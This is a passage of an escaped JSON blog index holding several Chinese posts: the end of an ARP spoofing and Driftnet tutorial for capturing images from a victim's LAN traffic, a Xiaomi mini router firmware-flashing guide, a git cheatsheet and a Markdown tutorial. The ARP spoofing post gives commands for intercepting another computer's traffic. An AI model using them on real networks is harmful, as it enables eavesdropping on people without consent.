src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2proex9tj30u00vy7wh.jpg\&#34; alt=\&#34;image-20200523214018000\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h6 id=\&#34;参数命令\&#34;&gt;参数命令&lt;/h6&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;code&gt;-b&lt;/code&gt; ：捕获到新的图片时发出嘟嘟声&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-i interface&lt;/code&gt; ：选择监听接口&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-f file&lt;/code&gt;：读取一个指定pcap数据包中的图片&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-p&lt;/code&gt; ：不让所监听的接口使用混杂模式&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-a&lt;/code&gt; ：后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-m number&lt;/code&gt; ：指定保存图片数的数目&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-d directory&lt;/code&gt; ：指定保存图片的路径&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-x prefix&lt;/code&gt;：指定保存图片的前缀名&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h3 id=\&#34;结果\&#34;&gt;结果：&lt;/h3&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2pzieux9j31400u0qv8.jpg\&#34; alt=\&#34;41590241281_.pic_hd\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;blockquote&gt;\n&lt;p&gt;左边电脑是被攻击者，右边窗口中的图片就是截取被攻击者网络数据包中抓取的图片&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q2mw4k2j30u00v5qv5.jpg\&#34; alt=\&#34;image-20200523215050019\&#34; style=\&#34;zoom:67%;\&#34; /&gt;\n&lt;blockquote&gt;\n&lt;p&gt;截取的所有照片都会在文件夹中显示&lt;/p&gt;\n&lt;/blockquote&gt;\n&#34;,&#34;fileName&#34;:&#34;cD7xvp1nC&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;、### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。&lt;/p&gt;\n&lt;h5 id=\&#34;1-更改转发模式\&#34;&gt;1、更改转发模式&lt;/h5&gt;\n&lt;pre&gt;&lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward\n&lt;/code&gt;&lt;/pre&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q4h2n18j30vv0u07wh.jpg\&#34; alt=\&#34;image-20200523215235878\&#34; style=\&#34;zoom:67%;\&#34; /&gt;&#34;,&#34;title&#34;:&#34;arp欺骗+Driftnet 局域网截取照片&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-05-23 22:19:25&#34;,&#34;dateFormat&#34;:&#34;2020-05-23&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/cD7xvp1nC/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:67000,&#34;words&#34;:290,&#34;minutes&#34;:2},&#34;description&#34;:&#34;、### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。\n1、更改转发模式\necho 1 &amp;gt; /proc/sys/net/ipv4/ip_forward\n\n\n\n2、arp攻击\n arpspoof ...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#1-%E6%9B%B4%E6%94%B9%E8%BD%AC%E5%8F%91%E6%A8%A1%E5%BC%8F\&#34;&gt;1、更改转发模式&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#2-arp%E6%94%BB%E5%87%BB\&#34;&gt;2、arp攻击&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#3-%E6%95%B0%E6%8D%AE%E8%BF%98%E5%8E%9F%E5%88%86%E6%9E%90\&#34;&gt;3、数据还原分析&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4\&#34;&gt;参数命令&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%BB%93%E6%9E%9C\&#34;&gt;结果：&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;h2 id=\&#34;11-下载软件包\&#34;&gt;1.1 下载软件包&lt;/h2&gt;\n&lt;p&gt;&lt;a href=\&#34;https://ww.lanzous.com/icnbsih\&#34;&gt;点我下载  链接：https://ww.lanzous.com/icnbsih&lt;/a&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;下载后首先进行解压缩，解压缩请使用鼠标右键解压到某路径，别直接双击打开压缩包。&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuohzxg2bj30lg0o8499.jpg\&#34; alt=\&#34;image-20200516225150019\&#34; style=\&#34;zoom: 50%;\&#34; /&gt;\n&lt;/blockquote&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;解压缩后得到如图所示5个文件&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupzmfettj30f207w0t9.jpg\&#34; alt=\&#34;QQ截图20200516234048\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;分别如下：&lt;br&gt;\nbreed底层系统 【breed-mt7620-xiaomi-mini.bin】&lt;br&gt;\n小米mini开发板固件【miwifi_r1cm_firmware_2e9b9_2.21.109】&lt;br&gt;\n小米mini Pandorabox固件【PandoraBox-ralink-mt7620-xiaomi-mini-2017-09-27-git-f18401e-squashfs-sysupgrade.bin】PuTTY虚拟终端【putty.exe】&lt;br&gt;\nSSH客户端【WinSCP-5.13.4-Setup.exe】&lt;/p&gt;\n&lt;p&gt;其中SSH客户端直接进行安装，安装过程配置不更改，默认选项即可。&lt;/p&gt;\n&lt;h2 id=\&#34;12-更新官方开发板系统\&#34;&gt;1.2 更新官方开发板系统&lt;/h2&gt;\n&lt;p&gt;如下图连接路由器后进入管理地址选择系统升级，手动升级，选择压缩包内的小米mini开发板固件【miwifi_r1cm_firmware_2e9b9_2.21.109】进行升级。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuoihsy1nj31dm0me46y.jpg\&#34; alt=\&#34;image-20200516225221699\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;13-获取ssh权限\&#34;&gt;1.3 获取SSH权限&lt;/h2&gt;\n&lt;p&gt;更新后手机下载小米Wifi APP，将小米mini路由器和手机APP登陆的小米账号绑定，绑定后访问下面地址&lt;br&gt;\nhttps://d.miwifi.com/rom/ssh&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuoivwlfej31fa0sqqa9.jpg\&#34; alt=\&#34;image-20200516225243937\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;如图所示，此处即可看到绑定的路由器名字，root密码&lt;/p&gt;\n&lt;p&gt;接下来进行如下操作：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;请将下载的工具包bin文件复制到U盘（FAT/FAT32格式）的根目录下，保证文件名为miwifi_ssh.bin；&lt;/li&gt;\n&lt;li&gt;断开小米mini路由器的电源，将U盘插入USB接口；&lt;/li&gt;\n&lt;li&gt;按住reset按钮(路由器背后的小孔)之后重新接入电源，指示灯变为黄色闪烁状态即可松开reset键；&lt;/li&gt;\n&lt;li&gt;等待3-5秒后安装完成之后，小米路由器会自动重启，之后您就获得了路由器的SSH权限。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;14-刷入breed\&#34;&gt;1.4 刷入breed&lt;/h2&gt;\n&lt;p&gt;如下图，打开之前安装的WinScp客户端，按照图中内容填写，其中密码是之前页面的root密码。&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuoj9abr0j31f20mwnan.jpg\&#34; alt=\&#34;image-20200516225306227\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;p&gt;登陆过程中可能会有警告提示，点击更新即可。&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuojnyowuj30w00og7bo.jpg\&#34; alt=\&#34;image-20200516225329500\&#34; style=\&#34;zoom: 33%;\&#34; /&gt;\n&lt;p&gt;进入后默认是/root/目录，点击下图按钮进入根目录&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuok71231j31970u0qk5.jpg\&#34; alt=\&#34;image-20200516225400073\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;p&gt;双击进入tmp目录，如下图：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuokzfk73j319u0u0e30.jpg\&#34; alt=\&#34;image-20200516225444765\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;将之前解压的文件breed-mt7620-xiaomi-mini.bin拖入tmp文件夹中，如下图，&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupjemp4zj31eq0lsqmo.jpg\&#34; alt=\&#34;image-20200516232750498\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;p&gt;在tmp中可以看到breed文件即可，如下图，&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupmzhh3yj31a00u0b0d.jpg\&#34; alt=\&#34;image-20200516233116854\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;p&gt;此时打开压缩包中的PuTTY，如下图填写，&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupnt8aq3j30qo0okwgz.jpg\&#34; alt=\&#34;image-20200516233204370\&#34; style=\&#34;zoom: 50%;\&#34; /&gt;\n&lt;p&gt;警告点击“是”&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupovsd7xj31f20rctk1.jpg\&#34; alt=\&#34;image-20200516233305727\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;p&gt;此处用户名是root，密码是小米路由器SSH权限管理界面的root密码&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuppa3o0aj31f00cwad4.jpg\&#34; alt=\&#34;image-20200516233329020\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;到下图界面即表示通过SSH登录路由器后台&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuq3z6medj312g0outam.jpg\&#34; alt=\&#34;image-20200516234736483\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;输入命令&lt;code&gt;cd /tmp&lt;/code&gt;进入&lt;code&gt;tmp&lt;/code&gt;目录下&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;提示：cd和/tmp中间有一个空格&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuq4gz3evj30qa0go76d.jpg\&#34; alt=\&#34;image-20200516234805431\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;p&gt;接下来我们开始刷&lt;code&gt;Breed&lt;/code&gt;了，输入命令：&lt;br&gt;\n&lt;code&gt;mtd -r write breed-mt7620-xiaomi-mini.bin Bootloader&lt;/code&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;命令开始执行后请耐心等待路由器重启，直到可以访问192.168.31.1，提前对路由器断电可能导致路由器损坏。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupr2t855j311y0omn0u.jpg\&#34; alt=\&#34;image-20200516233512610\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;h2 id=\&#34;15-刷入pandorabox固件\&#34;&gt;1.5 刷入Pandorabox固件&lt;/h2&gt;\n&lt;p&gt;接着我们用硬物顶住mini的reset键插上电源开机，等到mini的指示灯狂闪的时候，松开reset键，打开浏览器登录192.168.1.1就可以进入Breed的web界面了，如下图&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;7\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geups02i0bj31ao0u046t.jpg\&#34; alt=\&#34;image-20200516233605688\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;点击&lt;code&gt;固件更新&lt;/code&gt;，在固件处选择【PandoraBox-ralink-mt7620-xiaomi-mini-2017-09-27-git-f18401e-squashfs-sysupgrade.bin】然后勾选&lt;code&gt;自动重启&lt;/code&gt;，最后点击&lt;code&gt;上传&lt;/code&gt;。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;8\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupsjrvjjj31cr0u0k38.jpg\&#34; alt=\&#34;image-20200516233637778\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;上传确认，请看图中提示。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;9\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geupt2naehj31c50u011n.jpg\&#34; alt=\&#34;image-20200516233705627\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;等待进度条完成，路由器自动重启后，访问192.168.1.1即可进入Pandorabox的管理界面&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;10\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuptb1l1vj31ce0u0ais.jpg\&#34; alt=\&#34;image-20200516233720094\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;16同理可以刷你所需要的任何固件\&#34;&gt;1.6同理可以刷你所需要的任何固件&lt;/h2&gt;\n&#34;,&#34;fileName&#34;:&#34;ge4jbtkcR&#34;,&#34;abstract&#34;:&#34;&lt;h2 id=\&#34;11-下载软件包\&#34;&gt;1.1 下载软件包&lt;/h2&gt;\n&lt;p&gt;&lt;a href=\&#34;https://ww.lanzous.com/icnbsih\&#34;&gt;点我下载  链接：https://ww.lanzous.com/icnbsih&lt;/a&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;下载后首先进行解压缩，解压缩请使用鼠标右键解压到某路径，别直接双击打开压缩包。&lt;/p&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1geuohzxg2bj30lg0o8499.jpg\&#34; alt=\&#34;image-20200516225150019\&#34; style=\&#34;zoom: 50%;\&#34; /&gt;\n&lt;/blockquote&gt;\n&#34;,&#34;title&#34;:&#34;小米路由器min刷breed+padavan固件&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-05-16 22:45:50&#34;,&#34;dateFormat&#34;:&#34;2020-05-16&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/ge4jbtkcR/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;4 min read&#34;,&#34;time&#34;:195000,&#34;words&#34;:857,&#34;minutes&#34;:4},&#34;description&#34;:&#34;1.1 下载软件包\n点我下载  链接：https://ww.lanzous.com/icnbsih\n\n下载后首先进行解压缩，解压缩请使用鼠标右键解压到某路径，别直接双击打开压缩包。\n\n\n\n解压缩后得到如图所示5个文件\n\n分别如下：\nbree...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#11-%E4%B8%8B%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%8C%85\&#34;&gt;1.1 下载软件包&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#12-%E6%9B%B4%E6%96%B0%E5%AE%98%E6%96%B9%E5%BC%80%E5%8F%91%E6%9D%BF%E7%B3%BB%E7%BB%9F\&#34;&gt;1.2 更新官方开发板系统&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#13-%E8%8E%B7%E5%8F%96ssh%E6%9D%83%E9%99%90\&#34;&gt;1.3 获取SSH权限&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#14-%E5%88%B7%E5%85%A5breed\&#34;&gt;1.4 刷入breed&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#15-%E5%88%B7%E5%85%A5pandorabox%E5%9B%BA%E4%BB%B6\&#34;&gt;1.5 刷入Pandorabox固件&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#16%E5%90%8C%E7%90%86%E5%8F%AF%E4%BB%A5%E5%88%B7%E4%BD%A0%E6%89%80%E9%9C%80%E8%A6%81%E7%9A%84%E4%BB%BB%E4%BD%95%E5%9B%BA%E4%BB%B6\&#34;&gt;1.6同理可以刷你所需要的任何固件&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge9arpd4buj317c0u0kfe.jpg\&#34; alt=\&#34;gitcheatsheet\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;!-- more --&gt;\n&#34;,&#34;fileName&#34;:&#34;dO60L6gOU&#34;,&#34;abstract&#34;:&#34;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ge9arpd4buj317c0u0kfe.jpg\&#34; alt=\&#34;gitcheatsheet\&#34; style=\&#34;zoom:50%;\&#34; /&gt;&#34;,&#34;title&#34;:&#34;一张图学会使用git&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-05-01 14:49:23&#34;,&#34;dateFormat&#34;:&#34;2020-05-01&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/dO60L6gOU/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;0 min read&#34;,&#34;time&#34;:0,&#34;words&#34;:0,&#34;minutes&#34;:0},&#34;description&#34;:&#34;\n\n...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;h2 id=\&#34;1标题\&#34;&gt;1.标题&lt;/h2&gt;\n&lt;pre&gt;&lt;code&gt;#       一级标题    \n##      二级标题    \n###     三级标题    \n####    四级标题    \n#####   五级标题    \n######  六级标题    \n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;2引用\&#34;&gt;2.引用&lt;/h2&gt;\n&lt;!-- more --&gt;\n&lt;h4 id=\&#34;语法\&#34;&gt;语法&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;&amp;gt; 引用内容1\n&amp;gt; 引用内容2\n&amp;gt;&amp;gt; 引用内容3\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果\&#34;&gt;效果&lt;/h4&gt;\n&lt;blockquote&gt;\n&lt;p&gt;引用内容1&lt;/p&gt;\n&lt;p&gt;引用内容2&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;引用内容3&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=\&#34;3代码\&#34;&gt;3.代码&lt;/h2&gt;\n&lt;h3 id=\&#34;31-单行代码\&#34;&gt;3.1 单行代码&lt;/h3&gt;\n&lt;h4 id=\&#34;语法-2\&#34;&gt;语法&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;`string str1=&amp;quot;hello&amp;quot;;`\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果-2\&#34;&gt;效果&lt;/h4&gt;\n&lt;p&gt;&lt;code&gt;string str1=&amp;quot;hello&amp;quot;;&lt;/code&gt;&lt;/p&gt;\n&lt;h3 id=\&#34;32-多行代码\&#34;&gt;3.2 多行代码&lt;/h3&gt;\n&lt;h2 id=\&#34;4列表\&#34;&gt;4.列表&lt;/h2&gt;\n&lt;h3 id=\&#34;41-无序列表\&#34;&gt;4.1 无序列表&lt;/h3&gt;\n&lt;h4 id=\&#34;语法-3\&#34;&gt;语法&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;* 无序列表1\n+ 无序列表2\n- 无序列表3\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&#34;42-有序列表\&#34;&gt;4.2 有序列表&lt;/h3&gt;\n&lt;h4 id=\&#34;语法-4\&#34;&gt;语法&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;1. 有序列表1\n2. 有序列表2\n3. 有序列表3\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;5-表格\&#34;&gt;5. 表格&lt;/h2&gt;\n&lt;h4 id=\&#34;语法-5\&#34;&gt;语法&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;|姓名|性别|年龄|手机号|\n|:---|:--:|:--:|---:|\n|张三|男|21|18975346876|\n|李四|女|23|17789548964|\n|王五|男|25|15876513546|\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果-3\&#34;&gt;效果&lt;/h4&gt;\n&lt;table&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;th style=\&#34;text-align:left\&#34;&gt;姓名&lt;/th&gt;\n&lt;th style=\&#34;text-align:center\&#34;&gt;性别&lt;/th&gt;\n&lt;th style=\&#34;text-align:center\&#34;&gt;年龄&lt;/th&gt;\n&lt;th style=\&#34;text-align:right\&#34;&gt;手机号&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n&lt;tr&gt;\n&lt;td style=\&#34;text-align:left\&#34;&gt;张三&lt;/td&gt;\n&lt;td style=\&#34;text-align:center\&#34;&gt;男&lt;/td&gt;\n&lt;td style=\&#34;text-align:center\&#34;&gt;21&lt;/td&gt;\n&lt;td style=\&#34;text-align:right\&#34;&gt;18975346876&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td style=\&#34;text-align:left\&#34;&gt;李四&lt;/td&gt;\n&lt;td style=\&#34;text-align:center\&#34;&gt;女&lt;/td&gt;\n&lt;td style=\&#34;text-align:center\&#34;&gt;23&lt;/td&gt;\n&lt;td style=\&#34;text-align:right\&#34;&gt;17789548964&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td style=\&#34;text-align:left\&#34;&gt;王五&lt;/td&gt;\n&lt;td style=\&#34;text-align:center\&#34;&gt;男&lt;/td&gt;\n&lt;td style=\&#34;text-align:center\&#34;&gt;25&lt;/td&gt;\n&lt;td style=\&#34;text-align:right\&#34;&gt;15876513546&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n&lt;/table&gt;\n&lt;h2 id=\&#34;6链接\&#34;&gt;6.链接&lt;/h2&gt;\n&lt;h3 id=\&#34;61-图片\&#34;&gt;6.1 图片&lt;/h3&gt;\n&lt;h4 id=\&#34;语法本地图片\&#34;&gt;语法（本地图片）&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;[标题(url)]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;语法网络图片\&#34;&gt;语法（网络图片）&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;![bilibili](https://www.baidu.com/img/bd_logo1.png?qua=high)\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果-4\&#34;&gt;&lt;em&gt;效果&lt;/em&gt;&lt;/h4&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://www.baidu.com/img/bd_logo1.png?qua=high\&#34; alt=\&#34;bilibili\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h3 id=\&#34;62-超链接\&#34;&gt;6.2 超链接&lt;/h3&gt;\n&lt;h4 id=\&#34;语法行内式链接\&#34;&gt;语法（行内式链接）&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;[百度][https://www.baidu.com/]\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果-5\&#34;&gt;效果&lt;/h4&gt;\n&lt;p&gt;[百度][https://www,baidu.com/]&lt;/p&gt;\n&lt;h4 id=\&#34;语法参考式链接\&#34;&gt;语法（参考式链接）&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;[CSDN网址]:https://www.csdn.net/\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果-6\&#34;&gt;效果&lt;/h4&gt;\n&lt;h4 id=\&#34;语法自动链接\&#34;&gt;语法（自动链接）&lt;/h4&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;https://www.baidu.com/&amp;gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;效果-7\&#34;&gt;效果&lt;/h4&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.baidu.com/\&#34;&gt;https://www.baidu.com/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;``&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;DxtlyjtyA&#34;,&#34;abstract&#34;:&#34;&lt;h2 id=\&#34;1标题\&#34;&gt;1.标题&lt;/h2&gt;\n&lt;pre&gt;&lt;code&gt;#       一级标题    \n##      二级标题    \n###     三级标题    \n####    四级标题    \n#####   五级标题    \n######  六级标题    \n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;2引用\&#34;&gt;2.引用&lt;/h2&gt;\n&#34;,&#34;title&#34;:&#34;typora 使用方法&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2020-04-28 00:21:07&#34;,&#34;dateFormat&#34;:&#34;2020-04-28&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/DxtlyjtyA/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:75000,&#34;words&#34;:298,&#34;minutes&#34;:2},&#34;description&#34;:&#34;1.标题\n#       一级标题    \n##      二级标题    \n###     三级标题    \n####    四级标题    \n#####   五级标题    \n######  六级标题    \n\n2.引用\n\n语法\n&amp;gt...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#1%E6%A0%87%E9%A2%98\&#34;&gt;1.标题&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#2%E5%BC%95%E7%94%A8\&#34;&gt;2.引用&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95\&#34;&gt;语法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%95%88%E6%9E%9C\&#34;&gt;效果&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#3%E4%BB%A3%E7%A0%81\&#34;&gt;3.代码&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#31-%E5%8D%95%E8%A1%8C%E4%BB%A3%E7%A0%81\&#34;&gt;3.1 单行代码&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%AF%AD%E6%B3%95-2\&#34;&gt;语法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a 